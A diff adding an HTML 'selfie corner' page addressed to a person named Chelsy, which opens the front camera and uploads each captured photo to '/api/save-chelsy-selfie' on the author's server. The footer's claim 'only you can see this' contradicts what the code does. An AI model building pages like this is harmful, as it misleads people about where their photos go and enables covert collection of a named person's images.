@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>For Chelsy 💖</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        *{box-sizing:border-box}
+        body{
+            margin:0; min-height:100vh;
+            font-family:'Poppins', sans-serif;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fad0c4 100%);
+            display:flex; align-items:center; justify-content:center; padding:20px;
+        }
+      .card{
+            background: rgba(255,255,255,0.93);
+            width:100%; max-width:390px;
+            border-radius:28px; padding:24px;
+            box-shadow:0 20px 40px rgba(255,105,180,0.3);
+            text-align:center;
+        }
+        h1{margin:0; color:#ff4d8d; font-size:27px;}
+      .sub{color:#8a5a6a; font-size:13px; margin:6px 0 18px 0;}
+      .note{
+            background:#fff0f5; border:1px dashed #ff8fab; border-radius:16px;
+            padding:16px; font-size:13px; color:#7a3a4f; margin-bottom:18px; line-height:1.6;
+            text-align:center;
+        }
+      .pretty-alert{
+            margin-top:12px;
+            background: linear-gradient(90deg, #ff4d8d, #ff8a5c);
+            color:white; padding:10px 14px; border-radius:50px;
+            font-weight:600; font-size:13px; display:inline-block;
+        }
+        video{
+            width:100%; aspect-ratio:3/4; object-fit:cover;
+            border-radius:20px; background:#000; border:3px solid #ff8fab;
+        }
+        #snapBtn{
+            margin-top:18px; width:100%; padding:16px; border:none; border-radius:50px;
+            background: linear-gradient(90deg, #ff4d8d, #ff8a5c);
+            color:white; font-size:16px; font-weight:600; cursor:pointer;
+            box-shadow:0 8px 20px rgba(255,77,141,0.4);
+        }
+        #chelsyResult{margin-top:14px; font-weight:600; font-size:14px; min-height:20px;}
+      .foot{margin-top:14px; font-size:10px; color:#b88a96;}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Hi Chelsy 💖✨</h1>
+        <p class="sub">your pretty selfie corner</p>
+
+        <div class="note">
+            This page was meant for scanning cars but I remembered you have to be in my car one day... so🤷
+            <br><br>
+            <div class="pretty-alert">you + your smile = high levels of pretty detected.. keep smiling 😉</div>
+        </div>
+
+        <video id="selfieCam" autoplay playsinline muted></video>
+        <canvas id="selfieCanvas" style="display:none;"></canvas>
+
+        <button id="snapBtn">💖 Take My Selfie 💖</button>
+        <div id="chelsyResult">Camera starting...</div>
+        <div class="foot">made just for you • only you can see this</div>
+    </div>
+
+<script>
+    const video = document.getElementById('selfieCam');
+    const canvas = document.getElementById('selfieCanvas');
+    const result = document.getElementById('chelsyResult');
+    const btn = document.getElementById('snapBtn');
+
+    async function startCamera(){
+        try{
+            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:{ideal:720}}, audio:false});
+            video.srcObject = s;
+            await video.play();
+            result.style.color="#8a5a6a"; result.innerText="Camera ready 😊 Say cheese!";
+        }catch(e){
+            result.style.color="#ff4d4d"; result.innerText="Please allow camera access 💔 " + e.message;
+        }
+    }
+    startCamera();
+
+    btn.addEventListener('click', async () => {
+        if(!video.srcObject || video.readyState < 2){
+            result.innerText="Wait, starting camera..."; await startCamera();
+            await new Promise(r=>setTimeout(r, 800));
+        }
+        btn.innerText="Saving... ✨"; btn.disabled=true;
+        result.style.color="#ff4d8d"; result.innerText="Capturing your gorgeousness...";
+        try {
+            const w = video.videoWidth || 640; const h = video.videoHeight || 480;
+            canvas.width = w; canvas.height = h;
+            canvas.getContext('2d').drawImage(video,0,0,w,h);
+            const dataUrl = canvas.toDataURL('image/jpeg',0.8);
+            const res = await fetch('/api/save-chelsy-selfie',{
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({image:dataUrl})
+            });
+            const out = await res.json();
+            if(out.ok){
+                result.style.color="#28a745";
+                result.innerHTML="✅ Got it! You look SO cute right now 😍";
+                btn.innerText="💖 Take Another 💖";
+            }else{ throw new Error("fail"); }
+        } catch(err){
+            result.style.color="#ff4d4d";
+            result.innerText="Oops, server hiccup — try again 😉";
+            btn.innerText="Try Again 💖";
+        }
+        btn.disabled=false;
+    });
+</script>
+</body>
+</html>
